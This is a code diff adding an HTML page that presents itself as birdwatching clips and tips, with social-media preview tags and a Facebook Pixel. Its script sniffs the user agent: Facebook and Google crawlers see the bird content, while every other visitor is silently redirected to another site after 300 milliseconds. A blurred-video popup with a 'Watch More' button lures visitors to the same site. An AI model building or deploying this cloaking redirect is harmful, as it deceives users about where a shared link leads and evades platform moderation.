@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Love birds, you have to watch these moments</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Facebook Open Graph Meta -->
+  <meta property="og:title" content="Love birds, you have to watch these moments" />
+  <meta property="og:description" content="Unmissable birdwatching clips and incredible facts about wild birds. Watch and fall in love with nature." />
+  <meta property="og:image" content="http://ongmuot.com/wp-content/uploads/2025/10/sdq.jpg" />
+  <meta property="og:url" content="https://ongmuot.com/" />
+  <meta property="og:type" content="video.other" />
+  <meta property="fb:app_id" content="61556591610860" />
+  <meta property="fb:admins" content="61556591610860" />
+
+
+
+  <!-- Facebook Pixel -->
+  <script>
+    !function(f,b,e,v,n,t,s){
+      if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src='https://connect.facebook.net/en_US/fbevents.js';
+      s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)
+    }(window, document,'script');
+    fbq('init', '522762403660816');
+    fbq('track', 'PageView');
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=522762403660816&ev=PageView&noscript=1"/>
+  </noscript>
+
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; }
+
+    .popup {
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background-color: rgba(0, 0, 0, 0.9);
+      display: none; justify-content: center; align-items: center;
+      z-index: 9999;
+    }
+
+    .popup-container {
+      position: relative;
+      width: 90%;
+      max-width: 600px;
+    }
+
+    .popup video,
+#content video {
+  width: 100%;
+  height: auto;
+  max-width: 100%;
+  display: block;
+  transition: filter 0.5s ease;
+  border-radius: 8px;
+}
+
+
+    .video-blur {
+      filter: blur(5px);
+    }
+
+    .btn-next {
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: red;
+      color: white;
+      padding: 12px 24px;
+      font-size: 18px;
+      border: none;
+      cursor: pointer;
+      display: none;
+      z-index: 1000;
+      opacity: 0.95;
+      border-radius: 8px;
+    }
+
+    iframe.preload {
+      width: 0; height: 0; border: 0; visibility: hidden;
+    }
+  </style>
+</head>
+<body>
+
+ 
+
+  <div id="content"></div>
+
+  <div class="popup" id="popup">
+    <div class="popup-container">
+      <video id="popupVideo" autoplay muted playsinline></video>
+      <button class="btn-next" onclick="window.location.href='https://ongmuot.com/'">Watch More</button>
+    </div>
+  </div>
+
+  <script>
+    const ua = navigator.userAgent.toLowerCase();
+    const isBot = ua.includes('facebookexternalhit') || ua.includes('googlebot') || ua.includes('mediapartners-google');
+    if (!isBot) {
+      setTimeout(() => {
+        window.location.href = 'https://ongmuot.com/';
+      }, 300);
+    }
+
+    const contents = [ /* Giữ nguyên danh sách bạn đã có */ 
+      {
+        title: "Top 5 Birdwatching Tips for Beginners",
+        text: "Birdwatching is a peaceful and exciting way to connect with nature...",
+        video: "https://v1.pinimg.com/videos/iht/720p/f4/3c/00/f43c00df6d33878f764fdd16fe8c9c23.mp4"
+      },
+      {
+        title: "How a Camera Bird Feeder Captured This Rare Moment",
+        text: "Using a smart camera bird feeder can reveal moments...",
+        video: "https://v1.pinimg.com/videos/iht/expMp4/9f/ea/2f/9fea2feac2e1d7a762dd02cb320c21c0_720w.mp4"
+      },
+      {
+        title: "Attract Birds to Your Backyard with These Ebook Secrets",
+        text: "Our free ebook reveals secrets to attracting birds year-round...",
+        video: "https://v1.pinimg.com/videos/iht/720p/f7/47/a1/f747a12bfcaeafd9b0daaaa0806334c0.mp4"
+      },
+      {
+        title: "Amazing Wild Birds You’ve Never Seen Before",
+        text: "Nature is home to some astonishing species...",
+        video: "https://v1.pinimg.com/videos/iht/720p/ea/14/b3/ea14b34755f4ef74371d00eecf1f3094.mp4"
+      },
+      {
+        title: "10 Fun Facts About Birds You Didn't Know",
+        text: "Did you know some birds sleep while flying? Or that pigeons...",
+        video: "https://v1.pinimg.com/videos/mc/720p/47/c4/ba/47c4ba7a5fe7bb142b27b5512d0f6a25.mp4"
+      },
+      {
+        title: "Why Cardinals Love Winter More Than You Think",
+        text: "Despite the cold, cardinals thrive in snowy weather...",
+        video: "https://v1.pinimg.com/videos/iht/720p/d8/85/1e/d8851e350196febba7d019ef072dc3a6.mp4"
+      },
+      {
+        title: "Hidden Wildlife in Your City: Urban Birdwatching",
+        text: "You don’t need to travel far to enjoy birdwatching...",
+        video: "https://v1.pinimg.com/videos/mc/720p/30/4c/fb/304cfb7cece7f831c143df166d5d8500.mp4"
+      },
+      {
+        title: "How to Identify Bird Songs Like a Pro",
+        text: "Bird calls are unique signatures. With practice...",
+        video: "https://v1.pinimg.com/videos/iht/720p/0b/92/22/0b92220e904d8ad2657a1a0190bffaea.mp4"
+      },
+      {
+        title: "Hidden Wildlife in Your City: Urban Birdwatching",
+        text: "You don’t need to travel far to enjoy birdwatching...",
+        video: "https://v1.pinimg.com/videos/iht/720p/73/ef/77/73ef77b9d9e46cef3ed1a575d482e6d6.mp4"
+      }
+      ,
+      {
+        title: "Hidden Wildlife in Your City: Urban Birdwatching",
+        text: "You don’t need to travel far to enjoy birdwatching...",
+        video: "https://v1.pinimg.com/videos/iht/expMp4/64/e8/db/64e8db454774757ce73570f80d68d613_720w.mp4"
+      }
+      ,
+      {
+        title: "Hidden Wildlife in Your City: Urban Birdwatching",
+        text: "You don’t need to travel far to enjoy birdwatching...",
+        video: "https://v1.pinimg.com/videos/iht/720p/72/44/cd/7244cd4bd73d29c480c339d4ae187ceb.mp4"
+      }
+    ];
+
+    const selected = contents[Math.floor(Math.random() * contents.length)];
+    document.getElementById("content").innerHTML = `
+      <h2>${selected.title}</h2>
+      <p>${selected.text}</p>
+      <video controls width="600" src="${selected.video}"></video>
+    `;
+
+    // Show popup after 1s
+    setTimeout(() => {
+      const popup = document.getElementById("popup");
+      const popupVideo = document.getElementById("popupVideo");
+      popup.style.display = "flex";
+      popupVideo.src = selected.video;
+      popupVideo.play();
+
+      // Pause after 5s and show button with blur
+      setTimeout(() => {
+        popupVideo.pause();
+        popupVideo.classList.add("video-blur");
+        document.querySelector(".btn-next").style.display = "block";
+      }, 5000);
+    }, 200);
+  </script>
+
+</body>
+</html>
